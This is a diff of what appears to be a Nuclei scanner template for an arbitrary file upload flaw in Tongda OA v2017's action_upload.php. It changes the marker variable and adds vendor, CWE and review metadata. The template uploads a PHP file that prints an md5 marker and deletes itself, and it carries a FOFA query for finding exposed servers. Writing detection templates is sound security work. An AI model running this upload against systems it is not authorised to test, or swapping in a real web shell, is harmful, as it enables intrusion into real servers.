@@ -3,7 +3,7 @@ http:
   - part: body_2
     type: word
     words:
-    - '{{md5(num)}}'
+    - '{{md5(string)}}'
   - status:
     - 200
     type: status
@@ -51,7 +51,7 @@ http:
     Content-Type: application/octet-stream
 
 
-    <?php echo md5({{num}});unlink(__FILE__);?>
+    <?php echo md5("{{string}}");unlink(__FILE__);?>
 
     ------WebKitFormBoundaryjhddzlqp
 
@@ -71,6 +71,10 @@ http:
 id: tongda-action-uploadfile
 info:
   author: SleepingBag945
+  classification:
+    cpe: cpe:2.3:a:tongda2000:office_anywhere_2017:*:*:*:*:*:*:*:*
+    cwe-id:
+    - CWE-434
   description: 'Tongda OA v2017 action_upload.php file filtering is insufficient and
     does not require background permissions, resulting in arbitrary file upload vulnerabilities
 
@@ -78,12 +82,15 @@ info:
   metadata:
     fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
     max-request: 2
+    product: office_anywhere_2017
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
+    vendor: tongda2000
     verified: true
   name: Tongda OA v2017 action_upload - Arbitrary File Upload
   reference:
   - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
   - https://github.com/shadow1ng/fscan/blob/main/WebScan/pocs/tongda-v2017-uploadfile.yml
   severity: critical
-  tags: tongda,fileupload,intrusive,router
+  tags: fileupload,intrusive,router,tongda,vuln
 variables:
-  num: '999999999'
+  string: tongda-action-uploadfile
